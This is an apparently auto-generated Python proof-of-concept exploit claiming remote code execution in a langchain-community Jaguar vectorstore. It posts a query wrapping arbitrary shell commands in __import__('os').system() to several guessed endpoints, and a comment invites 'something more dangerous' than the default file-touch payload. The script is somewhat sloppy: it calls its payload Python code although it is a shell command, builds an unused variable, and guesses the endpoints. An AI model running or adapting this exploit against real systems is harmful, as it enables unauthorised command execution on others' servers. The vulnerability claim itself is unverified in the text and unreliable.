#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-012
# Sink: worker
# Auto-generated — run with: python3 rce_sink_function_worker_python_worker.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for langchain-community-only RCE
Vulnerability: Remote Code Execution via exec() sink in worker()
Target: Jaguar vectorstore run() -> worker() chain
"""

import sys
import json
import time
import argparse
from typing import Optional

# Try to import requests, provide helpful error if missing
try:
    import requests
except ImportError:
    print("[!] This PoC requires the 'requests' library.")
    print("    Install it with: pip install requests")
    sys.exit(1)


def exploit(target_url: str, payload: str, timeout: int = 10) -> Optional[str]:
    """
    Attempt to trigger RCE by sending a malicious query to the Jaguar vectorstore.
    
    The attack path:
    1. Send a crafted query to the Jaguar run() endpoint
    2. The query flows through the vectorstore chain
    3. Eventually reaches worker() which executes exec() on the input
    
    Args:
        target_url: Base URL of the vulnerable service
        payload: Python code to execute (use benign payloads for testing)
        timeout: Request timeout in seconds
    
    Returns:
        Response text if successful, None otherwise
    """
    
    # The vulnerable endpoint - adjust based on actual service deployment
    # Common patterns for vectorstore APIs
    endpoints = [
        f"{target_url}/v1/retrieve",
        f"{target_url}/api/v1/query",
        f"{target_url}/query",
        f"{target_url}/run",
    ]
    
    # Craft the malicious query that will trigger exec()
    # The payload gets passed through the chain and eventually to exec()
    malicious_query = {
        "query": f"__import__('os').system('{payload}')",
        "k": 1,
        "metadata_filter": None
    }
    
    headers = {
        "Content-Type": "application/json"
    }
    
    for endpoint in endpoints:
        try:
            print(f"[*] Trying endpoint: {endpoint}")
            response = requests.post(
                endpoint,
                json=malicious_query,
                headers=headers,
                timeout=timeout
            )
            
            if response.status_code == 200:
                print(f"[+] Success! Endpoint {endpoint} responded with 200")
                print(f"[*] Response: {response.text[:500]}")
                return response.text
            else:
                print(f"[-] Endpoint {endpoint} returned status {response.status_code}")
                
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection refused to {endpoint}")
        except requests.exceptions.Timeout:
            print(f"[-] Timeout connecting to {endpoint}")
        except Exception as e:
            print(f"[-] Error with {endpoint}: {e}")
    
    return None


def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community RCE via Jaguar vectorstore"
    )
    parser.add_argument(
        "target",
        help="Target URL (e.g., http://localhost:8000 or http://victim.com:8080)"
    )
    parser.add_argument(
        "--payload",
        default="touch /tmp/poc_success.txt",
        help="Python code to execute (default: create /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)"
    )
    
    args = parser.parse_args()
    
    print("[*] langchain-community RCE PoC")
    print(f"[*] Target: {args.target}")
    print(f"[*] Payload: {args.payload}")
    print(f"[*] Timeout: {args.timeout}s")
    print()
    
    # Benign payload by default - change to something more dangerous for actual testing
    # WARNING: Only use on systems you own or have permission to test
    benign_payload = f"__import__('os').system('{args.payload}')"
    
    print("[*] Attempting exploitation...")
    result = exploit(args.target, args.payload, args.timeout)
    
    if result:
        print("\n[+] Exploit appears successful!")
        print("[*] Check target system for evidence of execution")
        print(f"[*] Expected: {args.payload}")
    else:
        print("\n[-] Exploit failed - target may not be vulnerable or endpoint differs")
        print("[*] Try different endpoints or check if service is running")
        sys.exit(1)


if __name__ == "__main__":
    main()
